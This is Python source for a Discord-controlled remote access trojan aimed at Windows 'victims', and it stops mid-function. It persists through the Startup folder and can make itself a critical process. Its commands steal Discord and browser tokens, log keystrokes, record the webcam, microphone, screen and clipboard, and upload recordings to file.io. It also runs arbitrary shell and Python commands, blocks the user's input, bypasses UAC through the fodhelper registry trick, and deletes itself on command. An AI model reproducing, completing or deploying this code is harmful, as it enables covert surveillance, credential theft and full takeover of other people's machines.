import discord 
import json 
import subprocess 
import asyncio
import ctypes 
import os 
import threading 
import requests 
import time 
import cv2 
import win32clipboard
import win32process
import win32con
import win32gui
import winreg
import re
import sys
import shutil
import pyautogui
from urllib.request import urlopen, urlretrieve
from time import sleep
from mss import mss
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import base64
from discord_components import *
from discord.ext import commands
from discord_slash.context import ComponentContext
from discord_slash import SlashContext, SlashCommand
from discord_slash.model import ButtonStyle
from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component
from discord import Webhook, RequestsWebhookAdapter
def ping(host):
    import platform
    # Option for the number of packets as a function of
    if platform.system().lower()=='windows':
        param = '-n'
    else:
        param = '-c'

    # Building the command. Ex: "ping -c 1 google.com"
    command = ['ping', param, '1', host]

    return subprocess.call(command) == 0
def wificheck():
    hostname = "google.com"
    # Run ping function
    result = ping(hostname)
    # If there is a connection to google.com, all good
    if result == True:
        return(True)
    # If there is no connection to google.com, restart the WiFi-module
    else:
        time.sleep(2)
        scnd = ping(hostname)
        if scnd == False:
            os.system("networksetup -setairportpower airport off")
            time.sleep(5)
            os.system("networksetup -setairportpower airport on")
            time.sleep(5)
            return('restarted')
        else:
            return(False)
with urlopen("http://ipinfo.io/json") as url:
    data = json.loads(url.read().decode())
    global ip
    global country
    global city
    ip = data['ip']
    country = data['country']
    city = data['city']



weblink = "your 000webhost link"


    

status = False
while status == False:
    wificheck()
    if (wificheck() == True):
        global webhookMode
        try:
            global webhook
            webhooklink = base64.b64decode(requests.get(weblink+"/private/webhook").text.rstrip()).decode("utf-8")
            webhook = Webhook.from_url(webhooklink, adapter=RequestsWebhookAdapter())
            status = True
            webhookMode = True  
        except:
            webhookMode = False
        status = True
    else:
        time.sleep(60)

def destruct():
    while True:
        try:
            destruct = (requests.get(weblink+"/private/desctruct").text.rstrip()).decode("utf-8")
            if destruct == "goodbye":
                if webhookMode:
                    webhook.send(f"```desctruct mode is on {ip} has destroyed```")
                import inspect
                import os
                import inspect
                uncritproc()
                cmd2 = inspect.getframeinfo(inspect.currentframe()).filename
                hello = os.getpid()
                bat = """@echo off""" + " & " + "taskkill" + r" /F /PID " + str(hello) + " &" + " del " + '"' + cmd2 + '"' + r" /F" + " & " + r"""start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b"""
                temp = (os.getenv("TEMP"))
                temp5 = temp + r"\delete.bat"
                if os.path.isfile(temp5):
                    delelee = "del " + temp5 + r" /f"
                    os.system(delelee)                
                f5 = open(temp + r"\delete.bat", 'a')
                f5.write(bat)
                f5.close()
                os.system(r"start /min %temp%\delete.bat")
        except:
            pass
        time.sleep(60)
tdestruct = threading.Thread(target=destruct)

client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Discord RAT to shits on pc\'s')
slash = SlashCommand(client, sync_commands=True)
def get_token():
    status = False
    while status == False:
        try:
            global token
            token = base64.b64decode(requests.get(weblink+"/private/token").text.rstrip()).decode("utf-8")
            status = True  
        except:
            if webhookMode == True:
                try:
                    webhook.send(f"{os.getlogin()} | {ip} | {country} | {city} || have an error with the token please solve it here {weblink}/public")
                except:
                    pass
            time.sleep(60)
    return True


def get_gild():
    status = False
    while status == False:
        try:
            global requestgild
            global g
            requestgild = int(base64.b64decode(requests.get(weblink+"/private/gild").text.rstrip()).decode("utf-8"))
            g = []
            g.append(requestgild)
            status = True  
        except:
            if webhookMode == True:
                try:
                    webhook.send(f"{os.getlogin()} | {ip} | {country} | {city} || have an error with the server gild please solve it here {weblink}/public")
                except:
                    pass            
            time.sleep(60)
    return True


status = False
while status == False:
    wificheck()
    if (wificheck() == True):
        tdestruct.start()
        get_token()
        get_gild()
        status = True
    else:
        time.sleep(60)

is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
from sys import executable
exename = executable.split('\\')
exename = (exename[-1])
subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
#subprocess.run(f'start "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\Startup\{exename}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)


def critproc():
    import ctypes
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def uncritproc():
    import ctypes
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0

@client.event
async def on_slash_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.MissingPermissions):
        await ctx.send('You do not have permission to execute this command')
    else:
        print(error)

@client.event
async def on_command_error(cmd, error):
    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
        pass
global stop_threads
async def activity(client):
    while True:
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
        sleep(1)

@client.event
async def on_ready():
    global channel_name
    DiscordComponents(client)
    number = 0

    process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
    wtype = process2.communicate()[0].decode().strip("Caption\n").strip()

    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  

    if number == 0:
        channel_name = "session-1"
        await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        await client.guilds[0].create_text_channel(channel_name)
        
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here ✔ New session, opened **{channel_name}** | **{wtype}** | **{ip}, {country}/{city}**\n> Succesfully gained access to user **`{os.getlogin()}`**"
    if is_admin == True:
        await channel.send(f'{value1} with **`admin`** perms')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)

on_ready.total = []

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def MuteVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)



global stop_threads

@slash.slash(name="stopngrok", description="stop ngrok", guild_ids=g)
async def stopngrok_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            global ngrokMode
            ngrokMode = False
            ngrok_tunnel = "ngrok has stoped"
            await ctx.send("ngrok stoped")


@slash.slash(name="ngroklink", description="send ngrok link", guild_ids=g)
async def ngroklink_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            try:
                await ctx.send(f"link {ngrok_tunnel}")
            except:
                await ctx.send("there is no link")



@slash.slash(name="camshot", description="dump key loggs", guild_ids=g)
async def dumpkeylog_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
                import os
                import time
                import cv2
                temp = (os.getenv('TEMP'))
                camera_port = 0
                camera = cv2.VideoCapture(camera_port)
                #time.sleep(0.1)
                return_value, image = camera.read()
                cv2.imwrite(temp + r"\temp.png", image)
                del(camera)
                file = discord.File(temp + r"\temp.png", filename="temp.png")
                await ctx.send("[*] Command successfuly executed", file=file)


@slash.slash(name="winstop", description="winstart stop windows logg", guild_ids=g)
async def winstop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            global stop_threads
            stop_threads = True
            await ctx.send("Window logging for this session stopped")
            game = discord.Game(f"Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)  


@slash.slash(name="winstart", description="winstart start windows logg", guild_ids=g)
async def winstart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            global stop_threads
            stop_threads = False
            threading.Thread(target=between_callback, args=(client,)).start()
            await ctx.send("Window logging for this session started")



@slash.slash(name="discordtoken", description="send discord tokens", guild_ids=g)
async def discordtoken_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
                await ctx.send(f"extracting tokens...")
                tokens = []
                saved = ""
                paths = {
                    'Discord': os.getenv('APPDATA') + r'\\discord\\Local Storage\\leveldb\\',
                    'Discord Canary': os.getenv('APPDATA') + r'\\discordcanary\\Local Storage\\leveldb\\',
                    'Lightcord': os.getenv('APPDATA') + r'\\Lightcord\\Local Storage\\leveldb\\',
                    'Discord PTB': os.getenv('APPDATA') + r'\\discordptb\\Local Storage\\leveldb\\',
                    'Opera': os.getenv('APPDATA') + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                    'Opera GX': os.getenv('APPDATA') + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                    'Amigo': os.getenv('LOCALAPPDATA') + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
                    'Torch': os.getenv('LOCALAPPDATA') + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
                    'Kometa': os.getenv('LOCALAPPDATA') + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
                    'Orbitum': os.getenv('LOCALAPPDATA') + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                    'CentBrowser': os.getenv('LOCALAPPDATA') + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                    '7Star': os.getenv('LOCALAPPDATA') + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                    'Sputnik': os.getenv('LOCALAPPDATA') + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                    'Vivaldi': os.getenv('LOCALAPPDATA') + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                    'Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                    'Chrome': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                    'Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                    'Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
                    'Uran': os.getenv('LOCALAPPDATA') + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                    'Yandex': os.getenv('LOCALAPPDATA') + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                    'Brave': os.getenv('LOCALAPPDATA') + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                    'Iridium': os.getenv('LOCALAPPDATA') + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
                }
                for source, path in paths.items():
                    if not os.path.exists(path):
                        continue
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    tokens.append(token)
                for token in tokens:
                    r = requests.get("https://discord.com/api/v9/users/@me", headers={
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                        "Authorization": token
                    })
                    if r.status_code == 200:
                        if token in saved:
                            continue
                        saved += f"`{token}`\n\n"
                if saved != "":
                    await ctx.send(f"**Token(s) succesfully grabbed:** \n{saved}")
                else:
                    await ctx.send(f"**User didn't have any stored tokens**")




@slash.slash(name="deletekeylog", description="delete key loggs", guild_ids=g)
async def deletekeylog_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            keyLogFile = (os.getenv("TEMP") + "/key_log.txt")
            (os.remove(keyLogFile))
            await ctx.send("deleted")



@slash.slash(name="dumpkeylog", description="dump key loggs", guild_ids=g)
async def dumpkeylog_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
                file_keys = os.path.join(os.getenv("TEMP") + "/key_log.txt")
                file = discord.File(file_keys, filename=file_keys)
                await ctx.send("Successfully dumped all the logs", file=file)
                os.remove(file_keys)


@slash.slash(name="startkeylog", description="start key logger", guild_ids=g)
async def startkeylog_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import os
        from pynput.keyboard import Key, Listener
        import logging
        stopkey = False
        temp = os.getenv("TEMP")
        log_dir = temp
        logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                            level=logging.DEBUG, format='%(asctime)s: %(message)s')
        def keylog():
            def on_press(key):
                logging.info(str(key))
            with Listener(on_press=on_press) as listener:
                listener.join()
                if stopkey == True:
                    return
        import threading
        global test
        test = threading.Thread(target=keylog)
        test._running = True
        test.daemon = True
        test.start()
        await ctx.send("Keylogger Started!")

@slash.slash(name="exit", description="exit program", guild_ids=g)
async def exit_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
                buttons = [
                        create_button(
                            style=ButtonStyle.green,
                            label="✔"
                        ),
                        create_button(
                            style=ButtonStyle.red,
                            label="X"
                        ),
                    ]
                action_row = create_actionrow(*buttons)
                await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])

                res = await client.wait_for('button_click')
                if res.component.label == "✔":
                    await ctx.send(content="Exited the program!", hidden=True)
                    os._exit(0)
                else:
                    await ctx.send(content="Cancelled the exit", hidden=True)




@slash.slash(name="kill", description="kill sessions", guild_ids=g)
async def kill_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            for y in range(len(on_ready.total)): 
                if "session" in on_ready.total[y]:
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
                    await channel_to_delete.delete()
                else:
                    pass
            await ctx.send(f"Killed all the inactive sessions")




@slash.slash(name="info", description="general info", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            try:
                url = 'http://ipinfo.io/json'
                response = urlopen(url)
                data = json.load(response)
                UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
                googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
                process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
                wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\n").strip()
                process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
                wtype = process2.communicate()[0].decode().strip("Caption\n").strip()

                userdata = f"```fix\n------- {os.getlogin()} -------\nComputername: {os.getenv('COMPUTERNAME')}\nIP: {data['ip']}\nUsing VPN?: {UsingVPN}\nOrg: {data['org']}\nCity: {data['city']}\nRegion: {data['region']}\nPostal: {data['postal']}\nWindowskey: {wkey}\nWindows Type: {wtype}\n```**Map location: {googlemap}**\n"
                await ctx.send(userdata)
            except:await ctx.send("error trying to get info") 



import wx 
import wx.html2 

class MyBrowser(wx.Dialog): 
    def __init__(self, *args, **kwds): 
        wx.Dialog.__init__(self, *args, **kwds) 
        sizer = wx.BoxSizer(wx.VERTICAL) 
        self.browser = wx.html2.WebView.New(self) 
        sizer.Add(self.browser, 1, wx.EXPAND, 10) 
        self.SetSizer(sizer) 
        self.SetSize((700, 700))



@slash.slash(name="webwindow", description="open a web withow the url in a window", guild_ids=g)
async def webwindow_command(ctx: SlashContext, url: str):
    if ctx.channel.name == channel_name:
        if url.startswith("http://") or url.startswith("https://"):
            try:
                ctx.send("web window started")
                app = wx.App() 
                dialog = MyBrowser(None, -1)
                dialog.browser.LoadURL(url) 
                dialog.Show() 
                app.MainLoop()
            except Exception as e:
                ctx.send("```try other link```")
                ctx.send(e)
        else:
            ctx.send("you need to put https:// or http://")









def change_res(cap, width, height):
    cap.set(3, width)
    cap.set(4, height)

def get_dims(cap, res='1080p'):
    STD_DIMENSIONS =  {
        "480p": (640, 480),
        "720p": (1280, 720),
        "1080p": (1920, 1080),
        "4k": (3840, 2160),
    }
    width, height = STD_DIMENSIONS["480p"]
    if res in STD_DIMENSIONS:
        width,height = STD_DIMENSIONS[res]
    change_res(cap, width, height)
    return width, height


@slash.slash(name="python", description="takes a video of their webcam", guild_ids=g)
async def python_command(ctx: SlashContext, script: str):
    if ctx.channel.name == channel_name:
            from io import StringIO
            import sys, os
            import traceback
            new_stdout = StringIO()
            old_stdout = sys.stdout
            sys.stdout = new_stdout
            new_stderr = StringIO()
            old_stderr = sys.stderr
            sys.stderr = new_stderr
            if os.path.exists(script):
                await ctx.send("[*] Running python file...")
                with open(script, 'r') as f:
                    python_code = f.read()
                    try:
                        exec(python_code)
                    except Exception as exc:
                        await ctx.send(traceback.format_exc())
            else:
                await ctx.send("[*] Running python command...")
                try:
                    exec(script)
                except Exception as exc:
                    await ctx.send(traceback.format_exc())
            sys.stdout = old_stdout
            sys.stderr = old_stderr
            await ctx.send(new_stdout.getvalue() + new_stderr.getvalue())


@slash.slash(name="webcam", description="takes a video of their webcam", guild_ids=g)
async def webcam_command(ctx: SlashContext, secons: int):
    if ctx.channel.name == channel_name:
        await ctx.send("Taking video of webcam. . .")
        temp = os.path.join(f"{os.getenv('TEMP')}\\videoo.mp4")
        res = '720p'
        t_end = time.time() + secons

        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            out = cv2.VideoWriter(temp, cv2.VideoWriter_fourcc(*'X264'), 25, get_dims(cap, res))
            while time.time() < t_end:
                ret, frame = cap.read()
                out.write(frame)
            cap.release()
            out.release()
            cv2.destroyAllWindows()
        else:
            await ctx.send(f"**{os.getlogin()}'s** has no webcam :/")
        import requests
        response = requests.post('https://file.io/', files={"file": open(temp, "rb")}).json()["link"]
        await ctx.send(f"download link: " + response)



@slash.slash(name="recmic", description="takes a record of their mic", guild_ids=g)
async def recmic_command(ctx: SlashContext, secons: int):
    if ctx.channel.name == channel_name:
            import pyaudio
            import wave
            CHUNK = 1024 
            FORMAT = pyaudio.paInt16 #paInt8
            CHANNELS = 1
            RATE = 44100 #sample rate
            RECORD_SECONDS = secons
            temp = (os.getenv('TEMP'))
            WAVE_OUTPUT_FILENAME = temp + "\\audioo.wav"

            p = pyaudio.PyAudio()

            stream = p.open(format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            input=True,
                            frames_per_buffer=CHUNK) #buffer

            await ctx.send("* recording")

            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data) # 2 bytes(16 bits) per channel

            print("* done recording")

            stream.stop_stream()
            stream.close()
            p.terminate()

            wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            

            import requests
            response = requests.post('https://file.io/', files={"file": open(temp+"\\audioo.wav", "rb")}).json()["link"]
            await ctx.send(f"download link: " + response)



@slash.slash(name="screenshot", description="take a screenshot", guild_ids=g)
async def screenshot_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
        with mss() as sct:
            sct.shot(output=temp)
        file = discord.File(temp, filename="monitor.png")
        await ctx.send("Screenshot taken!", file=file)
        os.remove(temp)


@slash.slash(name="MaxVolume", description="set their sound to max", guild_ids=g)
async def MaxVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MaxVolume()
        await ctx.send("Volume set to **100%**")


@slash.slash(name="MuteVolume", description="set their sound to 0", guild_ids=g)
async def MuteVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MuteVolume()
        await ctx.send("Volume set to **0%**")


@slash.slash(name="Wallpaper", description="Change their wallpaper", guild_ids=g)
async def Wallpaper_command(ctx: SlashContext, link: str):
    if ctx.channel.name == channel_name:
        if re.match(r'^(?:http|ftp)s?://', link) is not None:
            image_formats = ("image/png", "image/jpeg", "image/jpg", "image/x-icon",)
            r = requests.head(link)
            if r.headers["content-type"] in image_formats:
                path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
                urlretrieve(link, path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                await ctx.send(f"Successfully Changed their wallpaper to:\n{link}")
            else:
                await ctx.send("Link needs to be a url to an image!")
        else:
            await ctx.send("Invalid link!")


@slash.slash(name="upload", description="upload a file", guild_ids=g)
async def upload_command(ctx: SlashContext, url: str,filename: str,file_path: str):
    if ctx.channel.name == channel_name:
            from datetime import datetime
            if '"' in file_path:
                file_path = file_path.replace('"','')
            try: 
                os.chdir(file_path)
            except: 
                return await ctx.followup.send("Invalid directory!")
            
            try:
                r = requests.get(url, allow_redirects=True)
            except:
                return await ctx.followup.send("Invalid URL!")

            with open(filename, "wb") as f: 
                f.write(r.content)
                
            await ctx.send(
                    "File successfully sent to PC!", 
                    datetime.now(), 
                    "File path: " + file_path
                )
            

@slash.slash(name="Shell", description="run shell commands", guild_ids=g)
async def Shell_command(ctx: SlashContext, command: str):
    if ctx.channel.name == channel_name:
        def shell():
            output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            return output

        shel = threading.Thread(target=shell)
        shel._running = True
        shel.start()
        sleep(1)
        shel._running = False

        result = str(shell().stdout.decode('CP437'))
        numb = len(result)

        if result != "":
            if numb < 1:
                await ctx.send("unrecognized command or no output was obtained")
            elif numb > 1990:
                f1 = open("output.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File("output.txt", filename="output.txt")

                await ctx.send("Command successfully executed", file=file)
                os.remove("output.txt")
            else:
                await ctx.send(f"Command successfully executed:\n```\n{result}```")
        else:
            await ctx.send("unrecognized command or no output was obtained")

@slash.slash(name="Write", description="Make the user type what ever you want", guild_ids=g)
async def Write_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        import pyautogui
        import time
        buttons = [
                        create_button(
                            style=ButtonStyle.green,
                            label="✔"
                        ),
                        create_button(
                            style=ButtonStyle.red,
                            label="X"
                        ),
        ]
        action_row = create_actionrow(*buttons)
        await ctx.send("You want to press enter when finish writing?", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "✔":
                    await ctx.send(content="Press enter True", hidden=True)
                    pressEnter = True
        else:
                    await ctx.send(content="Press enter False", hidden=True)
        try:
            await ctx.send(f"Typing. . .")
            for letter in message:
                pyautogui.typewrite(letter);sleep(0.00001)
            if pressEnter == True:
                pyautogui.press('enter')
        except Exception as e:
                await ctx.send(f"Error\n```\n{e}```")
        await ctx.send(f"Done typing\n```\n{message}```")


@slash.slash(name="Clipboard", description="get their current clipboard", guild_ids=g)
async def Clipboard_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            await ctx.send(f"Their Current Clipboard is:\n```{data}```")
        except:
            await ctx.send(f'Clip format is not valid')

@slash.slash(name="hokeys", description="hokeys", guild_ids=g)
async def hokeys_command(ctx: SlashContext, key1: str,key2: str,times: int=1):
    if ctx.channel.name == channel_name:
        import pyautogui
        try:
            await ctx.send("pressing")
            for i in range(times):
                pyautogui.hotkey(key1, key2)
            await ctx.send(f"press {key1}  {key2}   {times} times")
        except Exception as e:
            await ctx.send(e)

@slash.slash(name="AdminCheck", description=f"check if DiscordRAT has admin perms", guild_ids=g)
async def AdminCheck_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            embed = discord.Embed(title="AdminCheck", description=f"DiscordRAT Has Admin privileges!")
            await ctx.send(embed=embed)
        else:
            embed=discord.Embed(title="AdminCheck",description=f"DiscordRAT does not have admin privileges")
            await ctx.send(embed=embed)


@slash.slash(name="IdleTime", description=f"check for how long your victim has been idle for", guild_ids=g)
async def IdleTime_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [
                ('cbSize', ctypes.c_uint),
                ('dwTime', ctypes.c_int),
            ]
        def get_idle_duration():
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
                millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                return millis / 1000
            else:
                return 0
        duration = get_idle_duration()
        await ctx.send(f"**{os.getlogin()}'s** been idle for {duration} seconds.")


@slash.slash(name="BlockInput", description="Blocks user's keyboard and mouse", guild_ids=g)
async def BlockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            await ctx.send(f"Blocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Sorry! Admin rights are required for this command")


@slash.slash(name="UnblockInput", description="UnBlocks user's keyboard and mouse", guild_ids=g)
async def UnblockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(False)
            await ctx.send(f"Unblocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Sorry! Admin rights are required for this command")
            

@slash.slash(name="MsgBox", description="make a messagebox popup on their screen with a custom message", guild_ids=g)
async def MessageBox_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        def msgbox(message, type):
            return ctypes.windll.user32.MessageBoxW(0, message, "Attention!", type | 0x1000)

        select = create_select(
        options=[
            create_select_option(label="Error", value="Errors", emoji="⚠"),
            create_select_option(label="Warning", value="Warnings", emoji="⚠"),
            create_select_option(label="Info", value="Infos", emoji="ℹ"),
            create_select_option(label="Question", value="Questions", emoji="⚠"),
        ],
        placeholder="Choose your type", 
        min_values=1,
        max_values=1,
    )   
        await ctx.send("What type of messagebox do you want to popup?", components=[create_actionrow(select)])

        select_ctx: ComponentContext = await wait_for_component(client, components=[create_actionrow(select)])
        if select_ctx.selected_options[0] == 'Errors':
            threading.Thread(target=msgbox, args=(message, 16)).start()
            await select_ctx.edit_origin(content=f"Sent an Error Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Warnings':
            threading.Thread(target=msgbox, args=(message, 48)).start()
            await select_ctx.edit_origin(content=f"Sent an Warning Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Infos':
            threading.Thread(target=msgbox, args=(message, 64)).start()
            await select_ctx.edit_origin(content=f"Sent an Info Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Questions':
            threading.Thread(target=msgbox, args=(message, 32)).start()
            await select_ctx.edit_origin(content=f"Sent an Question Message Asking {message}")




@slash.slash(name="AdminRequest", description="this will try to get admin", guild_ids=g)
async def AdminRequest_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes, sys
        await ctx.send("trying")
        def is_admin():
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False

        if is_admin():
            await ctx.send("`you are admin`")
        else:
            # Re-run the program with admin rights
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            await ctx.send("`request send`")

@slash.slash(name="AdminForce", description="try and bypass uac and get admin rights", guild_ids=g)
async def AdminForce_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"attempting to get admin privileges. . .")
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == False:
            try:
                    os.system("""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force""")
                    os.system("""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force""") 
                    os.system("""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start""" + sys.argv[0] +"-Force")
            
                    class disable_fsr():
                        disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                        revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                        def __enter__(self):
                            self.old_value = ctypes.c_long()
                            self.success = self.disable(ctypes.byref(self.old_value))
                        def __exit__(self, type, value, traceback):
                            if self.success:
                                self.revert(self.old_value)
                    with disable_fsr():
                        os.system("fodhelper.exe")

                    sleep(2)
                    os.system("""powershell Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force""")
            except:
                await ctx.send("Problem when tried to get admin")        
        else:
            await ctx.send("You already have admin privileges")


@slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
async def Startup_command(ctx: SlashContext, reg_name: str):
    if ctx.channel.name == channel_name:
